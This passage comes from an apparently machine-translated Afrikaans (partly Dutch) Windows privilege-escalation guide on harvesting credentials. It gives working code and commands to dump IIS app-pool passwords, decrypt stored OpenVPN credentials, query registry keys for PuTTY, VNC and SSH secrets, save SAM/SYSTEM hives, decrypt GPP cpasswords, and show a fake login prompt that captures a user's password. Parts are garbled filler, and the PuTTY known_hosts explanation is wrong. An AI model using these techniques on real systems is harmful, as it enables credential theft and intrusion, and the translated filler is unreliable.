# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kyk of `C:\Windows\CCM\SCClient.exe` bestaan.\
Installeerders word **met SISTEEM-bevoegdhede uitgevoer**, baie is kwesbaar vir **DLL Sideloading (Inligting vanaf** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Legitimasie)

### Putty Legitimasie
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Gasheer Sleutels

Putty is 'n gewilde SSH-kliënt wat gebruik word om veilige verbinding met 'n SSH-bediener te maak. Wanneer jy vir die eerste keer 'n SSH-verbinding met 'n bediener maak, sal Putty die gasheer sleutels van die bediener stoor. Hierdie sleutels word gebruik om die integriteit en veiligheid van die verbinding te verseker.

Die gasheer sleutels word in Putty se konfigurasie-lêer, genaamd `known_hosts`, gestoor. Hierdie lêer bevat die openbare sleutels van die SSH-bedieners waarmee jy voorheen gekommunikeer het. Wanneer jy in die toekoms weer met dieselfde bediener wil kommunikeer, sal Putty die gasheer sleutels in die `known_hosts`-lêer vergelyk met die sleutels wat deur die bediener verskaf word. As die sleutels ooreenstem, sal die verbinding voortgaan sonder enige waarskuwings. As die sleutels nie ooreenstem nie, sal Putty 'n waarskuwing gee dat die gasheer sleutels verander het. Dit kan dui op 'n potensiële aanval of 'n verandering in die bediener se konfigurasie.

Dit is belangrik om die gasheer sleutels in die `known_hosts`-lêer te monitor en te verseker dat daar geen onbekende of verdagte sleutels in die lêer voorkom nie. As jy 'n nuwe sleutel sien of as jy vermoed dat die sleutels gekompromitteer is, moet jy die betrokke bediener se beheerder in kennis stel en moontlik jou eie sleutels herstel.

Dit is ook belangrik om die `known_hosts`-lêer te beskerm teen ongemagtigde toegang. As 'n aanvaller toegang tot hierdie lêer verkry, kan dit gebruik word om man-in-die-middel-aanvalle uit te voer of om jou te mislei deur 'n valse sleutel te gebruik.

Om die gasheer sleutels in Putty te sien, kan jy die volgende stappe volg:

1. Open Putty.
2. Voer die bediener se adres in die "Host Name (or IP address)"-veld in.
3. Kies die relevante verbindingsopsies (byvoorbeeld SSH, Telnet, ens.).
4. Klik op die "Open" knoppie.
5. Die eerste keer wat jy met die bediener verbind, sal Putty 'n waarskuwing gee oor die gasheer sleutels. Jy kan hierdie waarskuwing ignoreer of die sleutels in die `known_hosts`-lêer verifieer.
6. As jy die sleutels wil sien, kan jy die `known_hosts`-lêer handmatig oopmaak. Die lêer is gewoonlik in die volgende pad: `%userprofile%\.ssh\known_hosts`.

Deur die gasheer sleutels in Putty te monitor en te verseker dat slegs geldige sleutels in die `known_hosts`-lêer voorkom, kan jy die veiligheid van jou SSH-verbindinge handhaaf.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-sleutels in die register

SSH privaat sleutels kan binne die register sleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, dus moet jy nagaan of daar iets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoorde SSH-sleutel wees. Dit word versleutel gestoor, maar kan maklik ontsluit word deur [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract) te gebruik.\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties begin met opstart, voer die volgende uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh-sleutels te skep, hulle by te voeg met `ssh-add` en in te teken via ssh op 'n masjien. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` geïdentifiseer tydens die asimmetriese sleutelverifikasie nie.
{% endhint %}

### Onbesoekte lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met behulp van **metasploit**: _post/windows/gather/enum\_unattend_

Voorbeeld inhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- en SYSTEM-rugsteun

Om lokale beheerdersrechten te verkrijgen op een Windows-systeem, kan het nuttig zijn om back-ups te maken van de SAM- en SYSTEM-bestanden. Deze bestanden bevatten belangrijke informatie over gebruikersaccounts en beveiligingsinstellingen.

#### SAM-back-up

De SAM-database bevat gebruikersnamen en wachtwoordhashes. Om een back-up van de SAM-database te maken, moet je toegang hebben tot het Windows-besturingssysteem. Volg deze stappen:

1. Open een opdrachtprompt met beheerdersrechten.
2. Typ het volgende commando om een back-up van de SAM-database te maken:

   ```
   reg save HKLM\SAM C:\path\to\sam.backup
   ```

   Vervang `C:\path\to\sam.backup` door het pad waar je de back-up wilt opslaan.

#### SYSTEM-back-up

De SYSTEM-database bevat informatie over beveiligingsinstellingen en services. Om een back-up van de SYSTEM-database te maken, moet je toegang hebben tot het Windows-besturingssysteem. Volg deze stappen:

1. Open een opdrachtprompt met beheerdersrechten.
2. Typ het volgende commando om een back-up van de SYSTEM-database te maken:

   ```
   reg save HKLM\SYSTEM C:\path\to\system.backup
   ```

   Vervang `C:\path\to\system.backup` door het pad waar je de back-up wilt opslaan.

#### Gebruik van de back-ups

Zodra je de back-ups van de SAM- en SYSTEM-databases hebt gemaakt, kun je verschillende technieken gebruiken om de wachtwoordhashes te kraken en lokale beheerdersrechten te verkrijgen. Deze technieken omvatten het gebruik van tools zoals `samdump2`, `pwdump`, `mimikatz` en `hashcat`.

> Opmerking: Het maken van back-ups van de SAM- en SYSTEM-databases kan als verdacht worden beschouwd en kan worden gedetecteerd door beveiligingsoplossingen. Zorg ervoor dat je de juiste toestemmingen hebt en dat je de back-ups op een veilige manier gebruikt.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolkwaglegging

Wolkwaglegging is 'n kritieke aspek van die beveiliging van 'n wolk- of SaaS-platform. Dit verwys na die vertroulike inligting wat gebruik word om toegang tot die wolkomgewing te verkry, soos gebruikersname en wagwoorde, API-sleutels en sertifikate. Die beskerming van wolkwagwoorde is van uiterste belang om ongemagtigde toegang tot die wolkomgewing te voorkom. Dit sluit in die implementering van sterk wagwoordbeleide, die gebruik van multifaktor-verifikasie en die beperking van toegang tot slegs die nodige gebruikers en dienste. Dit is ook belangrik om wagwoorde gereeld te verander en om sekuriteitsbewustheid onder gebruikers te bevorder om hulle wagwoorde veilig te hou.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek na 'n lêer genaamd **SiteList.xml**

### Gekasde GPP-wagwoord

'n Funksie was voorheen beskikbaar wat die implementering van aangepaste plaaslike administrateurrekeninge op 'n groep masjiene moontlik gemaak het deur middel van Groepbeleidvoorkeure (GPP). Hierdie metode het egter aansienlike sekuriteitsgebreke gehad. Eerstens kon die Groepbeleidobjekte (GPO's), wat as XML-lêers in SYSVOL gestoor word, deur enige domein-gebruiker benader word. Tweedens kon die wagwoorde binne hierdie GPP's, wat met AES256 versleutel is deur gebruik te maak van 'n openlik gedokumenteerde verstek sleutel, deur enige geauthentiseerde gebruiker ontsleutel word. Dit het 'n ernstige risiko ingehou, aangesien dit gebruikers in staat kon stel om verhoogde bevoegdhede te verkry.

Om hierdie risiko te verminder, is 'n funksie ontwikkel om te soek na lokaal gekasde GPP-lêers wat 'n "cpassword" veld bevat wat nie leeg is nie. Wanneer so 'n lêer gevind word, ontsleutel die funksie die wagwoord en gee 'n aangepaste PowerShell-objek terug. Hierdie objek bevat besonderhede oor die GPP en die lêer se ligging, wat help om hierdie sekuriteitskwesbaarheid te identifiseer en te verhelp.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vorige aan W Vista)_ vir hierdie lêers:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Om die cPassword te ontsleutel:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te verkry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS-webkonfigurasie

Hierdie gids bevat inligting oor die IIS-webkonfigurasie en hoe dit gebruik kan word om sekuriteitsmaatreëls te implementeer. Die IIS-webkonfigurasie is 'n belangrike komponent van die Windows-bedryfstelsel wat gebruik word om die konfigurasie van webtoepassings te beheer. Hierdie gids sal jou help om die IIS-webkonfigurasie te verstaan en te hardloop om jou webtoepassings te versterk teen aanvalle.

#### Wat is die IIS-webkonfigurasie?

Die IIS-webkonfigurasie is 'n konfigurasiebestand wat gebruik word om die gedrag en instellings van webtoepassings wat op die IIS-bediener gehuisves word, te beheer. Dit bevat verskeie parameters en instellings wat die funksionaliteit en sekuriteit van die webtoepassings beïnvloed. Deur die IIS-webkonfigurasie te verander, kan jy sekuriteitsmaatreëls implementeer om die risiko van aanvalle te verminder.

#### Hoe om die IIS-webkonfigurasie te verander

Om die IIS-webkonfigurasie te verander, moet jy die volgende stappe volg:

1. Open die IIS-bestuurderskonsol.
2. Kies die webtoepassing wat jy wil konfigureer.
3. Klik op die "Konfigurasiebewerker" -opsie.
4. Soek die relevante konfigurasie-instelling wat jy wil verander.
5. Maak die nodige wysigings en stoor die veranderinge.

Dit is belangrik om die nodige voorbehoud te maak voordat jy enige veranderinge aanbring. Verkeerde konfigurasie-instellings kan die funksionaliteit van jou webtoepassing beïnvloed of sekuriteitslekke veroorsaak. Dit is raadsaam om 'n volledige rugsteun van die IIS-webkonfigurasie te maak voordat jy enige wysigings aanbring.

#### Sekuriteitsmaatreëls wat geïmplementeer kan word

Daar is verskeie sekuriteitsmaatreëls wat jy kan implementeer deur die IIS-webkonfigurasie te verander. Hier is 'n paar voorbeelde:

- **HTTP-na-HTTPS-omleiding**: Jy kan die IIS-webkonfigurasie gebruik om 'n omleiding van HTTP na HTTPS af te dwing. Dit sal verseker dat alle verkeer na jou webtoepassing versleutel is en die risiko van aanvalle soos man-in-die-middel verminder.
- **Toegangsbeheer**: Jy kan toegangsbeheer instel deur die IIS-webkonfigurasie te gebruik. Dit sluit in die beperking van toegang tot spesifieke IP-adresse, die vereis van gebruikersnaam en wagwoord vir toegang, en die instel van toegangsbeheer vir spesifieke gebruikersgroepe.
- **Sekuriteitskoppe**: Jy kan sekuriteitskoppe instel deur die IIS-webkonfigurasie te verander. Hierdie koppe kan help om aanvalle soos kruissite-skriping en kruissite-verknorsing te voorkom deur spesifieke beveiligingsbeleide af te dwing.
- **Foutbestuur**: Jy kan foutbestuur instel deur die IIS-webkonfigurasie te verander. Dit sluit in die instel van aangepaste foutbladsye en die beperking van die inligting wat aan kliënte verskaf word tydens 'n fout.

Hierdie is slegs 'n paar voorbeelde van die sekuriteitsmaatreëls wat jy kan implementeer deur die IIS-webkonfigurasie te verander. Dit is belangrik om die spesifieke behoeftes van jou webtoepassing te oorweeg en die nodige maatreëls te implementeer om die risiko van aanvalle te verminder.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met geloofsbrieven:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-gedragskode

Hierdie gedeelte bevat inligting oor die OpenVPN-gedragskode. Dit is belangrik om hierdie inligting te verstaan ​​om OpenVPN-kredensiale effektief te gebruik.

#### OpenVPN-kredensiale

OpenVPN-kredensiale is die gebruikersnaam en wagwoord wat gebruik word om toegang tot 'n OpenVPN-diens te verkry. Hierdie kredensiale word gewoonlik deur die diensverskaffer verskaf en moet vertroulik gehou word. Dit is belangrik om sterk en unieke wagwoorde te gebruik om die veiligheid van die OpenVPN-verbinding te verseker.

#### Kredensiale opslaan

Dit is belangrik om OpenVPN-kredensiale veilig op te slaan. Dit kan gedoen word deur die kredensiale in 'n veilige wagwoordbestuurder of 'n versleutelde lêer te stoor. Dit verseker dat die kredensiale nie maklik toeganklik is vir onbevoegde persone nie.

#### Kredensiale deel

As jy OpenVPN-kredensiale moet deel met 'n ander persoon, moet jy dit op 'n veilige manier doen. Dit kan gedoen word deur die kredensiale persoonlik oor te dra of deur gebruik te maak van 'n veilige kommunikasiekanaal, soos 'n versleutelde e-pos of 'n privaat boodskapstelsel.

#### Kredensiale opdatering

Dit is belangrik om OpenVPN-kredensiale gereeld op te dateer. Dit sluit in die verandering van wagwoorde en die herroeping van ou kredensiale. Deur kredensiale op te dateer, word die veiligheid van die OpenVPN-verbinding gehandhaaf en die risiko van onbevoegde toegang verminder.

#### Kredensiale herstel

As jy jou OpenVPN-kredensiale verloor of vergeet het, moet jy kontak maak met die diensverskaffer om hulp te kry. Hulle kan jou help om jou kredensiale te herstel of nuwe kredensiale te verskaf. Dit is belangrik om die nodige stappe te neem om jou identiteit te verifieer voordat jy enige kredensiale herstel.

#### Kredensiale veiligheid

Die veiligheid van OpenVPN-kredensiale is van kritieke belang. Dit is belangrik om die nodige maatreëls te tref om die veiligheid van jou kredensiale te verseker. Dit sluit in die gebruik van sterk wagwoorde, die beskerming van jou toestel teen malware en die vermyding van die deel van kredensiale met onbevoegde persone.

#### Kredensiale bestuur

Dit is belangrik om 'n goeie kredensialebestuursbeleid te hê. Dit sluit in die gebruik van 'n wagwoordbestuurder, die gebruik van multifaktor-verifikasie en die implementering van beleide vir wagwoordverandering en kredensialeherstel. Deur 'n goeie kredensialebestuursbeleid te volg, kan jy die veiligheid van jou OpenVPN-kredensiale handhaaf.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logboeke

Logboeke is 'n belangrike bron van inligting vir 'n hacker wat probeer om plaaslike bevoorregting-escalasie op 'n Windows-stelsel uit te voer. Hierdie logboeke bevat waardevolle inligting oor aktiwiteite en gebeure wat plaasgevind het op die stelsel. Deur die analise van hierdie logboeke kan 'n hacker moontlike kwesbaarhede en geleenthede vir bevoorregting-escalasie identifiseer.

Daar is verskillende tipes logboeke wat relevant kan wees vir plaaslike bevoorregting-escalasie, insluitend:

- **Sekuriteitslogboeke**: Hierdie logboeke bevat inligting oor sekuriteitsgebeure, soos mislukte aanmeldingspogings, toegangspogings tot bevoorregte hulpbronne, en veranderinge in bevoorregtingvlakke.
- **Sistemiese logboeke**: Hierdie logboeke bevat inligting oor die werking van die stelsel, soos opstart- en afsluitgebeure, hardewarefoutmeldings, en veranderinge in konfigurasie-instellings.
- **Toepassingslogboeke**: Hierdie logboeke bevat inligting oor spesifieke toepassings wat op die stelsel geïnstalleer is, soos foute, waarskuwings en suksesvolle of mislukte operasies.

Om toegang tot hierdie logboeke te verkry, kan 'n hacker gebruik maak van verskeie tegnieke, soos die gebruik van bevoorregte rekenaarrekeninge, die gebruik van spesifieke opdragreëls, of die gebruik van hulpmiddels wat spesifiek ontwerp is vir die analise van logboeke.

Dit is belangrik vir 'n hacker om die relevante logboeke te analiseer en te ondersoek vir enige potensiële kwesbaarhede of geleenthede vir bevoorregting-escalasie. Hierdie inligting kan dan gebruik word om 'n aanval te beplan en uit te voer om bevoorregting op die stelsel te verkry.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra om geloofsbriewe

Jy kan altyd **vra dat die gebruiker sy geloofsbriewe invoer, of selfs die geloofsbriewe van 'n ander gebruiker**, as jy dink hy kan dit weet (let daarop dat **om die kliënt direk te vra vir die geloofsbriewe** werklik **riskant** is):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêernaam wat geloofsbriewe bevat**

Bekende lêers wat 'n tyd gelede **wagwoorde** in **duidelike teks** of **Base64** bevat het.
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Gelde in die HerwinBin

Jy moet ook die Bin ondersoek om te kyk of daar gelde binne-in is.

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik maak van: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Binne-in die register

**Ander moontlike register sleutels met gelde**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Onttrek openssh-sleutels uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiernavorsing

Jy moet kyk vir databasisse waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die geskiedenis, bladmerke en gunstelinge van die blaaier, sodat daar dalk **wagwoorde gestoor** word.

Hulpmiddels om wagwoorde uit blaaier te onttrek:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL-oorplasing**

**Component Object Model (COM)** is 'n tegnologie wat binne die Windows-bedryfstelsel gebou is en wat **onderlinge kommunikasie** tussen sagtewarekomponente van verskillende tale moontlik maak. Elke COM-komponent word **geïdentifiseer deur 'n klass-ID (CLSID)** en elke komponent stel funksionaliteit bloot deur een of meer interfaces, geïdentifiseer deur interfees-ID's (IIDs).

COM-klasse en -interfaces word in die register gedefinieer onder **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** en **HKEY\_**_**CLASSES\_**_**ROOT\Interface** onderskeidelik. Hierdie register word geskep deur die **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** saam te voeg.

Binne die CLSIDs van hierdie register kan jy die kinderregister **InProcServer32** vind wat 'n **verwysing na 'n verstekwaarde** bevat wat na 'n **DLL** wys, en 'n waarde genaamd **ThreadingModel** wat **Apartment** (Enkel-draad), **Free** (Multi-draad), **Both** (Enkel of Multi) of **Neutral** (Draadneutraal) kan wees.

![](<../../.gitbook/assets/image (638).png>)

Basies, as jy enige van die DLL's kan **oorplas** wat uitgevoer gaan word, kan jy **voorregte verhoog** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.

Om te leer hoe aanvallers COM-kaping gebruik as 'n volhardingsmeganisme, kyk na:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Generiese wagwoordsoektog in lêers en register**

**Soek na lêerinhoude**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n spesifieke lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek in die register vir sleutelname en wagwoorde**

Om sleutelname en wagwoorde in die register te soek, kan jy die volgende stappe volg:

1. Open die Register-Editor deur "regedit" in die soekbalk te tik en die toepassing te open.
2. Navigeer na die sleutel waarin jy wil soek deur die boomstruktuur aan die linkerkant van die Register-Editor te gebruik.
3. Klik op die sleutel waarin jy wil soek.
4. Kies "Soek" in die "Wysig" opsie in die boonste navigasiebalk.
5. Tik die sleutelnaam of wagwoord wat jy wil soek in die soekveld.
6. Kies die geskikte soekopsie, soos "Slegs sleutelname" of "Slegs wagwoorde".
7. Klik op die "Volgende soek" knoppie om die soekproses te begin.
8. As 'n ooreenstemming gevind word, sal dit gemerk word en kan jy die relevante inligting inspekteer.

Dit is belangrik om versigtig te wees wanneer jy in die register soek, aangesien dit sensitiewe inligting kan bevat.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat soek na wagwoorde

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf-inprop wat ek geskep het om outomaties elke metasploit POST-module uit te voer wat soek na wagwoorde** binne die slagoffer.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na alle lêers wat wagwoorde bevat wat in hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is 'n ander groot gereedskap om wagwoorde uit 'n stelsel te onttrek.

Die gereedskap [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** van verskeie gereedskap wat hierdie data in duidelike teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Uitgelek Handlers

Stel je voor dat **'n proses wat as SYSTEM loop 'n nuwe proses oopmaak** (`OpenProcess()`) met **volle toegang**. Dieselfde proses **maak ook 'n nuwe proses** (`CreateProcess()`) **met lae bevoegdhede, maar erf al die oop handvatsels van die hoofproses**.\
Dan, as jy **volle toegang het tot die proses met lae bevoegdhede**, kan jy die **oop handvat na die bevoorregte proses wat geskep is** met `OpenProcess()` gryp en 'n shellcode **inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander berig vir 'n meer volledige verduideliking oor hoe om meer oop handvatsels van prosesse en drade wat geërf is met verskillende vlakke van toestemmings (nie net volle toegang nie)** te toets en te misbruik](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Benoemde Pyp Kliënt Impersonasie

Gedeelde geheue segmente, bekend as **pype**, maak proses kommunikasie en data-oordrag moontlik.

Windows bied 'n funksie genaamd **Benoemde Pype**, wat onverwante prosesse in staat stel om data te deel, selfs oor verskillende netwerke. Dit lyk na 'n kliënt/bediener-argitektuur, met rolle wat gedefinieer word as **benoemde pype bediener** en **benoemde pype kliënt**.

